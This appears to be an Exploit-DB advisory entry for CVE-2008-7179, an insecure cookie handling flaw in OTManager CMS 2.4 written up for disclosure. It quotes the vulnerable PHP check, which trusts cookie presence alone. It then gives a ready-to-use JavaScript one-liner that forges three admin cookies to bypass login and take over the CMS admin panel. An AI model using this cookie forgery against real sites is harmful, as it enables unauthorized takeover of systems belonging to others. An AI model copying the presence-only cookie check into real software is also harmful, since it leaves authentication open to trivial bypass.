```text
### OTManager CMS 2.4 - Insecure Cookie Handling
#### EDB-ID: 5959
#### CVE: [2008-7179](https://nvd.nist.gov/vuln/detail/CVE-2008-7179)
#### Author: Virangar Security
#### Type: webapps
#### Platform: PHP
#### Date: 2008-06-27

**Vulnerable App:**
OTManager CMS v2.4

**Description:**
OTManager CMS suffers from insecure cookie handling. Upon successful admin login, the script creates a cookie to indicate the user is logged in. However, the cookie lacks password or similar authentication data. An attacker can craft a fake admin cookie to gain unauthorized admin access.

**Vulnerable Code:**
```php
if ($_COOKIE['ADMIN_Hora'] != '' and $_COOKIE['ADMIN_Logado'] == 'SIM' and $_COOKIE['ADMIN_Nome'] != ''){
header('Location: ADM_Pagina.php'); // redirect to admin area
```

**Exploit:**
```javascript
javascript:document.cookie = "ADMIN_Hora=1; path=/"; document.cookie = "ADMIN_Logado=SIM; path=/"; document.cookie = "ADMIN_Nome=1; path=/";
```
By setting these cookies, an attacker can bypass authentication and access the admin panel.

**Attack Vector:**
Crafting a cookie with specific values.

**Impact:**
Unauthorized access to the admin panel, leading to complete CMS control.

**Weakness:**
Insecure cookie handling. The application relies solely on the presence of specific cookie values for authentication, without proper validation.
```